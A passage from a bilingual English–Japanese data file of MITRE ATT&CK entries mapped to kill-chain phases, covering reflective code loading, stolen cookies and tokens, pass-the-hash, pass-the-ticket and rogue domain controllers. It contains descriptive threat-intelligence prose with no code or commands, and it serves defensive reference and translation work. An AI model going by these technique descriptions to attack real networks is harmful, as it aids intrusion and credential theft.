リフレクティブコードインジェクションは、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と非常によく似ていますが、「インジェクション」が別のプロセスのメモリではなく、プロセス自身のメモリにコードをロードする点が異なります。リフレクティブローディングは、任意のコードの実行が正当またはその他の良性のプロセスの下でマスクされる可能性があるため、プロセスベースの検出を回避する可能性があります。ペイロードをメモリに直接リフレクティブにロードすると、ディスク上にファイルやその他のアーティファクトを作成することを回避できる可能性があり、また、マルウェアが実行されるまでこれらのペイロードを暗号化（またはその他の方法で難読化）したままにすることも可能になります。(引用: Stuart ELF Memory)(引用: 00sec Droppers)(引用: Intezer ACBackdoor)(引用: S1 Old Rat New Tricks)","Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).

Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)

Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1550,代替認証マテリアルの使用,Use Alternate Authentication Material,"攻撃者は、パスワードハッシュ、Kerberosチケット、アプリケーションアクセストークンなどの代替認証マテリアルを使用して、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。

認証プロセスでは通常、有効なID（ユーザー名など）と1つ以上の認証要素（パスワード、PIN、物理スマートカード、トークンジェネレーターなど）が必要です。代替認証マテリアルは、ユーザーまたはアプリケーションが有効なIDと必要な認証要素を提供して正常に認証された後、システムによって正当に生成されます。代替認証マテリアルは、ID作成プロセス中に生成されることもあります。(引用: NIST Authentication)(引用: NIST MFA)

代替認証マテリアルをキャッシュすることにより、システムはユーザーに認証要素の再入力を求めることなく、IDが正常に認証されたことを確認できます。代替認証はシステムによってメモリまたはディスクに保持される必要があるため、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックによって盗まれるリスクがあります。代替認証マテリアルを盗むことにより、攻撃者はシステムアクセス制御をバイパスし、平文のパスワードや追加の認証要素を知らなくてもシステムに認証できます。","Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.

Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)

Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",T1550.004,Webセッションクッキー,Web Session Cookie,"攻撃者は、盗まれたセッションクッキーを使用してWebアプリケーションやサービスに認証できます。このテクニックは、セッションが既に認証されているため、一部の多要素認証プロトコルをバイパスします。(引用: Pass The Cookie)

認証クッキーは、ユーザーがサービスに認証した後、資格情報が渡されたり再認証が頻繁に行われたりする必要がないように、クラウドベースのサービスを含むWebアプリケーションで一般的に使用されます。クッキーは、Webアプリケーションがアクティブに使用されていなくても、長期間有効であることがよくあります。[Webセッションクッキーの窃取](https://attack.mitre.org/techniques/T1539)または[Webクッキー](https://attack.mitre.org/techniques/T1606/001)を通じてクッキーを取得した後、攻撃者は制御下にあるブラウザにクッキーをインポートし、セッションクッキーがアクティブである限りユーザーとしてサイトまたはアプリケーションを使用できます。サイトにログインすると、攻撃者は機密情報にアクセスしたり、メールを読んだり、被害者アカウントが実行する権限を持つアクションを実行したりできます。

多要素認証システムをバイパスするためにセッションクッキーを標的とするマルウェアの例があります。(引用: Unit 42 Mac Crypto Cookies January 2019)","Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)

Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.

There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1550,代替認証マテリアルの使用,Use Alternate Authentication Material,"攻撃者は、パスワードハッシュ、Kerberosチケット、アプリケーションアクセストークンなどの代替認証マテリアルを使用して、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。

認証プロセスでは通常、有効なID（ユーザー名など）と1つ以上の認証要素（パスワード、PIN、物理スマートカード、トークンジェネレーターなど）が必要です。代替認証マテリアルは、ユーザーまたはアプリケーションが有効なIDと必要な認証要素を提供して正常に認証された後、システムによって正当に生成されます。代替認証マテリアルは、ID作成プロセス中に生成されることもあります。(引用: NIST Authentication)(引用: NIST MFA)

代替認証マテリアルをキャッシュすることにより、システムはユーザーに認証要素の再入力を求めることなく、IDが正常に認証されたことを確認できます。代替認証はシステムによってメモリまたはディスクに保持される必要があるため、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックによって盗まれるリスクがあります。代替認証マテリアルを盗むことにより、攻撃者はシステムアクセス制御をバイパスし、平文のパスワードや追加の認証要素を知らなくてもシステムに認証できます。","Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.

Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)

Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",T1550.001,アプリケーションアクセストークン,Application Access Token,"攻撃者は、盗まれたアプリケーションアクセストークンを使用して、通常の認証プロセスをバイパスし、リモートシステム上の制限されたアカウント、情報、またはサービスにアクセスする可能性があります。これらのトークンは通常、ユーザーまたはサービスから盗まれ、ログイン資格情報の代わりに使用されます。

アプリケーションアクセストークンは、ユーザーまたはサービスに代わって承認されたAPIリクエストを行うために使用され、クラウド、コンテナベースのアプリケーション、およびSoftware-as-a-Service（SaaS）のリソースにアクセスするために一般的に使用されます。(引用: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)

OAuthは、システムへのアクセス用にユーザーにトークンを発行する一般的に実装されているフレームワークの1つです。これらのフレームワークは、ユーザーを検証し、ユーザーが実行できるアクションを決定するために共同で使用されます。IDが確立されると、トークンはユーザーの実際の資格情報を渡すことなくアクションを承認できます。したがって、トークンの侵害により、攻撃者は悪意のあるアプリケーションを通じて他のサイトのリソースにアクセスできるようになる可能性があります。(引用: okta)

例えば、クラウドベースの電子メールサービスでは、OAuthアクセストークンが悪意のあるアプリケーションに付与されると、バックグラウンドアクセスを可能にする「リフレッシュ」トークンが付与された場合、ユーザーアカウントの機能に長期間アクセスできる可能性があります。(引用: Microsoft Identity Platform Access 2019) OAuthアクセストークンを使用すると、攻撃者はユーザーが付与したREST APIを使用して、電子メールの検索や連絡先の列挙などの機能を実行できます。(引用: Staaldraad Phishing with OAuth 2017)

侵害されたアクセストークンは、他のサービスを侵害するための最初のステップとして使用される場合があります。例えば、トークンが被害者の主要な電子メールへのアクセスを許可する場合、攻撃者はパスワード忘れルーチンをトリガーすることにより、ターゲットが購読している他のすべてのサービスへのアクセスを拡張できる可能性があります。AWSおよびGCP環境では、攻撃者は別のユーザーアカウントの権限を持つ短期間のアクセストークンのリクエストをトリガーできます。(引用: Google Cloud Service Account Credentials)(引用: AWS Temporary Security Credentials) その後、攻撃者はこのトークンを使用して、元のアカウントではできなかったデータの要求やアクションの実行を行うことができます。この機能の権限が誤って構成されている場合（例えば、すべてのユーザーが特定のアカウントのトークンを要求できるようにするなど）、攻撃者はクラウドアカウントへの初期アクセスを取得したり、権限を昇格させたりできる可能性があります。(引用: Rhino Security Labs Enumerating AWS Roles)

トークンを介した直接APIアクセスは、第2認証要素の有効性を無効にし、パスワードの変更などの直感的な対策の影響を受けない可能性があります。例えば、AWS環境では、ユーザーのAWS API資格情報を侵害した攻撃者は、`sts:GetFederationToken` API呼び出しを使用してフェデレーションユーザーセッションを作成できます。これは元のユーザーと同じ権限を持ちますが、元のユーザー資格情報が無効化されても存続する可能性があります。(引用: Crowdstrike AWS User Federation Persistence) さらに、APIチャネルを介したアクセス乱用は、アクセスが正当なワークフローと依然としてよく整合している可能性があるため、サービスプロバイダー側からでも検出が困難な場合があります。","Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.

Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)

OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)

For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \""refresh\"" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)

Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)

Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1550,代替認証マテリアルの使用,Use Alternate Authentication Material,"攻撃者は、パスワードハッシュ、Kerberosチケット、アプリケーションアクセストークンなどの代替認証マテリアルを使用して、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。

認証プロセスでは通常、有効なID（ユーザー名など）と1つ以上の認証要素（パスワード、PIN、物理スマートカード、トークンジェネレーターなど）が必要です。代替認証マテリアルは、ユーザーまたはアプリケーションが有効なIDと必要な認証要素を提供して正常に認証された後、システムによって正当に生成されます。代替認証マテリアルは、ID作成プロセス中に生成されることもあります。(引用: NIST Authentication)(引用: NIST MFA)

代替認証マテリアルをキャッシュすることにより、システムはユーザーに認証要素の再入力を求めることなく、IDが正常に認証されたことを確認できます。代替認証はシステムによってメモリまたはディスクに保持される必要があるため、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックによって盗まれるリスクがあります。代替認証マテリアルを盗むことにより、攻撃者はシステムアクセス制御をバイパスし、平文のパスワードや追加の認証要素を知らなくてもシステムに認証できます。","Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.

Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)

Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",T1550.003,パスザチケット,Pass the Ticket,"攻撃者は、盗まれたKerberosチケットを使用して「パスザチケット」を行い、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。パスザチケット（PtT）は、アカウントのパスワードにアクセスすることなくKerberosチケットを使用してシステムに認証する方法です。Kerberos認証は、リモートシステムへの横方向の移動の最初のステップとして使用できます。

PtTを実行する場合、[有効なアカウント](https://attack.mitre.org/techniques/T1078)の有効なKerberosチケットは[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)によってキャプチャされます。アクセスレベルに応じて、ユーザーのサービスチケットまたはチケット付与チケット（TGT）を取得できます。サービスチケットは特定のリソースへのアクセスを許可しますが、TGTはチケット付与サービス（TGS）からサービスチケットを要求して、ユーザーがアクセスする権限を持つ任意のリソースにアクセスするために使用できます。(引用: ADSecurity AD Kerberos Attacks)(引用: GentilKiwi Pass the Ticket)

[シルバーチケット](https://attack.mitre.org/techniques/T1558/002)は、Kerberosを認証メカニズムとして使用するサービスに対して取得でき、その特定のリソースおよびそのリソースをホストするシステム（SharePointなど）にアクセスするためのチケットを生成するために使用されます。(引用: ADSecurity AD Kerberos Attacks)

[ゴールデンチケット](https://attack.mitre.org/techniques/T1558/001)は、キー配布サービスアカウントKRBTGTアカウントNTLMハッシュを使用してドメインに対して取得でき、Active Directory内の任意のアカウントのTGTを生成できます。(引用: Campbell 2014)

攻撃者はまた、盗まれたパスワードハッシュやAESキーなど、他のユーザー情報を使用して有効なKerberosチケットを作成する可能性があります。例えば、「オーバーパスザハッシュ」では、NTLMパスワードハッシュを使用してユーザーとして認証し（つまり[パスザハッシュ](https://attack.mitre.org/techniques/T1550/002)）、同時にパスワードハッシュを使用して有効なKerberosチケットを作成します。(引用: Stealthbits Overpass-the-Hash)","Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \""overpassing the hash\"" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1550,代替認証マテリアルの使用,Use Alternate Authentication Material,"攻撃者は、パスワードハッシュ、Kerberosチケット、アプリケーションアクセストークンなどの代替認証マテリアルを使用して、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。

認証プロセスでは通常、有効なID（ユーザー名など）と1つ以上の認証要素（パスワード、PIN、物理スマートカード、トークンジェネレーターなど）が必要です。代替認証マテリアルは、ユーザーまたはアプリケーションが有効なIDと必要な認証要素を提供して正常に認証された後、システムによって正当に生成されます。代替認証マテリアルは、ID作成プロセス中に生成されることもあります。(引用: NIST Authentication)(引用: NIST MFA)

代替認証マテリアルをキャッシュすることにより、システムはユーザーに認証要素の再入力を求めることなく、IDが正常に認証されたことを確認できます。代替認証はシステムによってメモリまたはディスクに保持される必要があるため、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックによって盗まれるリスクがあります。代替認証マテリアルを盗むことにより、攻撃者はシステムアクセス制御をバイパスし、平文のパスワードや追加の認証要素を知らなくてもシステムに認証できます。","Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.

Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)

Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",T1550.002,パスザハッシュ,Pass the Hash,"攻撃者は、盗まれたパスワードハッシュを使用して「パスザハッシュ」を行い、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。パスザハッシュ（PtH）は、ユーザーの平文パスワードにアクセスすることなくユーザーとして認証する方法です。この方法は、平文パスワードを必要とする標準的な認証ステップをバイパスし、パスワードハッシュを使用する認証の部分に直接移動します。

PtHを実行する場合、使用されているアカウントの有効なパスワードハッシュは、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックを使用してキャプチャされます。キャプチャされたハッシュはPtHと共に使用され、そのユーザーとして認証されます。認証されると、PtHを使用してローカルまたはリモートシステムでアクションを実行できます。

攻撃者はまた、盗まれたパスワードハッシュを使用して「オーバーパスザハッシュ」を行うこともあります。PtHと同様に、これにはパスワードハッシュを使用してユーザーとして認証することが含まれますが、パスワードハッシュを使用して有効なKerberosチケットも作成します。このチケットは、その後[パスザチケット](https://attack.mitre.org/techniques/T1550/003)攻撃を実行するために使用できます。(引用: Stealthbits Overpass-the-Hash)","Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to \""overpass the hash.\"" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1207,不正なドメインコントローラー,Rogue Domain Controller,"攻撃者は、Active Directoryデータを操作可能にするために、不正なドメインコントローラーを登録する可能性があります。DCShadowは、不正なドメインコントローラー（DC）を作成するために使用される場合があります。DCShadowは、DCの動作を登録（または非アクティブな登録を再利用）およびシミュレートすることにより、オブジェクトやスキーマを含むActive Directory（AD）データを操作する手法です。(引用: DCShadow Blog) 登録されると、不正なDCは、資格情報やキーを含む任意のドメインオブジェクトのADインフラストラクチャに変更を注入して複製できる可能性があります。

不正なDCの登録には、ADスキーマの構成パーティションに新しいサーバーオブジェクトとnTDSDSAオブジェクトを作成する必要があり、これには管理者権限（ドメインまたはDCローカルのいずれか）またはKRBTGTハッシュが必要です。(引用: Adsecurity Mimikatz Guide)

このテクニックは、不正なDCで行われたアクションがこれらのセンサーに報告されない可能性があるため、セキュリティ情報およびイベント管理（SIEM）製品などのシステムログ記録およびセキュリティ監視をバイパスする可能性があります。(引用: DCShadow Blog) このテクニックはまた、フォレンジック分析を妨害するために、レプリケーションやその他の関連メタデータを変更および削除するために使用される場合もあります。攻撃者はまた、このテクニックを利用して[SID履歴インジェクション](https://attack.mitre.org/techniques/T1134/005)を実行したり、ADオブジェクト（アカウント、アクセス制御リスト、スキーマなど）を操作して永続化のためのバックドアを確立したりする可能性があります。(引用: DCShadow Blog)","Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

